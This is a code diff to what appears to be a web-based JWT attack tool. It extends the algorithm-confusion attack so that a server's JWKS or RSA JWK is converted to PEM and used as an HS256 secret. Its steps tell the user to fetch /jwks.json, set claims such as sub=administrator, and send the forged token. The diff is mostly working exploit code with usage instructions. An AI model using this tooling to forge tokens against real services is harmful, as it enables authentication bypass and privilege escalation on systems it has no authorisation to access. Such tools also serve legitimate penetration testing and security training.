@@ -83,7 +83,7 @@ async function generateJwkAttackToken(forceJwkSign) {
 
     if (selectedAttack === 'algorithm-confusion') {
       const keyInput = requireInput('Provide server public key as Base64 PEM or raw PEM text.');
-      const keyBytes = parseAlgorithmConfusionKey(keyInput);
+      const keyBytes = await parseAlgorithmConfusionKey(keyInput);
       nextHeader.alg = 'HS256';
       delete nextHeader.jwk;
       delete nextHeader.jku;
@@ -197,7 +197,7 @@ function configureInputForAttack(key) {
 
   if (key === 'weak-signing-key') return showInput('Weak key / secret', 'secret1', 'Required for HS attack.');
 
-  if (key === 'algorithm-confusion') return showInput('Public key material', 'Base64 PEM or -----BEGIN PUBLIC KEY-----', 'Paste server public key as Base64 PEM (or raw PEM) to use as HS256 secret.');
+  if (key === 'algorithm-confusion') return showInput('JWKS / key input', '{"keys":[{...RSA JWK...}]}', 'Paste full JWKS JSON, single JWK JSON, Base64 PEM, or raw PEM. Tool will derive HS256 secret and sign automatically.');
 
   if (key === 'jwk-header-injection') {
     showInput('Public JWK JSON', '{"kty":"RSA","e":"AQAB","n":"..."}', 'Required JWK to inject. Generate key by selected alg below.');
@@ -283,12 +283,11 @@ function getAttackSteps(key) {
 
   if (key === 'algorithm-confusion') {
     return [
-      '1) Obtain server public key (from JWKS or PEM source).',
-      '2) Convert/copy public key as Base64 PEM (or keep raw PEM).',
-      '3) Paste key material into Attack-specific input.',
-      '4) Set payload claims as needed (for example sub=administrator).',
-      '5) Click Generate to produce HS256 token signed with provided key material.',
-      '6) Send request with generated token and validate behavior.',
+      '1) Obtain server JWKS (for example from /jwks.json).',
+      '2) Paste full JWKS JSON (or single JWK/PEM) into Attack-specific input.',
+      '3) Edit payload claims as needed (for example sub=administrator).',
+      '4) Click Generate. Tool converts key material and signs HS256 automatically.',
+      '5) Send request with generated token and validate behavior.',
     ].join('\n');
   }
 
@@ -479,12 +478,41 @@ function randomSecret(length) {
 
 
 
-function parseAlgorithmConfusionKey(input) {
+async function parseAlgorithmConfusionKey(input) {
   const value = input.trim();
+
+  if (value.startsWith('{')) {
+    const parsed = JSON.parse(value);
+    const jwk = parsed.keys ? parsed.keys[0] : parsed;
+    if (!jwk || jwk.kty !== 'RSA') throw new Error('Algorithm confusion currently expects RSA JWK input.');
+
+    const key = await crypto.subtle.importKey(
+      'jwk',
+      jwk,
+      { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
+      true,
+      ['verify'],
+    );
+    const spki = await crypto.subtle.exportKey('spki', key);
+    const pem = spkiToPem(spki);
+    return new TextEncoder().encode(pem);
+  }
+
   if (value.includes('BEGIN PUBLIC KEY') || value.includes('BEGIN RSA PUBLIC KEY')) {
     return new TextEncoder().encode(value);
   }
+
   return base64ToBytes(value);
+}
+
+function spkiToPem(spkiBuffer) {
+  const bytes = new Uint8Array(spkiBuffer);
+  let binary = '';
+  for (const b of bytes) binary += String.fromCharCode(b);
+  const b64 = btoa(binary).match(/.{1,64}/g).join('\n');
+  return `-----BEGIN PUBLIC KEY-----
+${b64}
+-----END PUBLIC KEY-----`;
 }
 
 function base64ToBytes(b64) {
